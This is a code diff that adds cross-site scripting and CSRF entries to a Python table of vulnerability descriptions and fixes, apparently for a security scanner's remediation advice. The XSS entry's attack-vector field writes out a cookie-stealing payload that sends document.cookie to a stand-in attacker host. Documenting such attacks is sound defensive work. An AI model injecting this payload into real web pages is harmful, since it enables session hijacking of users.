@@ -17,6 +17,8 @@ FIX_TEMPLATES = {
     "CWE-798": "Store credentials in environment variables or a secrets manager, never hardcoded in source.",
     "CWE-22": "Validate paths using os.path.realpath() and verify prefix matches the allowed directory.",
     "CWE-918": "Validate target URLs against a strict allowlist and block internal IP addresses (RFC 1918).",
+    "CWE-79": "Use contextual output encoding / safe DOM APIs (textContent) or sanitize HTML with DOMPurify.",
+    "CWE-352": "Enforce CSRF tokens and SameSite cookie attributes on all state-changing endpoints.",
 }
 
 CWE_DETAILS: dict[str, dict[str, Any]] = {
@@ -230,6 +232,48 @@ CWE_DETAILS: dict[str, dict[str, Any]] = {
             "ip = socket.gethostbyname(parsed.hostname)\n"
             "if ipaddress.ip_address(ip).is_private or ipaddress.ip_address(ip).is_loopback:\n"
             "    raise ValueError('Internal network access prohibited')"
+        ),
+    },
+    "CWE-79": {
+        "name": "Cross-Site Scripting (XSS) via Unsanitized DOM Sink",
+        "full_name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
+        "owasp": "A03:2021 – Injection",
+        "cwe_url": "https://cwe.mitre.org/data/definitions/79.html",
+        "description": "Writing unsanitized user data into DOM sinks such as innerHTML, document.write, or dangerouslySetInnerHTML allows arbitrary script execution in victims' browsers.",
+        "attack_vector": "An attacker submits payloads like `<img src=x onerror=fetch('https://attacker.tld?c='+document.cookie)>` which execute inside another user's authenticated browser session.",
+        "impact": "Session hijacking, DOM defacement, unauthorized state-changing actions, and client-side token exfiltration.",
+        "remediation_points": [
+            "Prefer `textContent` or framework-escaped bindings over `innerHTML` or `dangerouslySetInnerHTML`.",
+            "When rich HTML is strictly necessary, sanitize inputs using `DOMPurify.sanitize()` before rendering.",
+            "Enforce a strict Content-Security-Policy (CSP) header blocking inline script execution.",
+        ],
+        "secure_example": (
+            "# ❌ Vulnerable:\n"
+            "# element.innerHTML = userComment;\n\n"
+            "# ✅ Secure Alternative:\n"
+            "element.textContent = userComment;"
+        ),
+    },
+    "CWE-352": {
+        "name": "Cross-Site Request Forgery (CSRF) Protection Disabled",
+        "full_name": "Cross-Site Request Forgery (CSRF)",
+        "owasp": "A01:2021 – Broken Access Control",
+        "cwe_url": "https://cwe.mitre.org/data/definitions/352.html",
+        "description": "Disabling CSRF token validation on cookie-authenticated endpoints allows malicious third-party sites to forge state-changing requests.",
+        "attack_vector": "A malicious webpage embeds an auto-submitting form targeting a `@csrf_exempt` endpoint while the victim holds an active session cookie.",
+        "impact": "Unauthorized password/email changes, privilege modifications, or unintended financial/admin transactions.",
+        "remediation_points": [
+            "Keep framework CSRF middleware active for all cookie-authenticated POST/PUT/DELETE routes.",
+            "Set `SameSite=Lax` or `SameSite=Strict` on session cookies.",
+            "Require explicit anti-CSRF headers or Bearer tokens for cross-origin APIs.",
+        ],
+        "secure_example": (
+            "# ❌ Vulnerable:\n"
+            "# @csrf_exempt\n"
+            "# def update_email(request): ...\n\n"
+            "# ✅ Secure Alternative (Keep CSRF verification enabled):\n"
+            "def update_email(request):\n"
+            "    verify_csrf_token(request)"
         ),
     },
 }
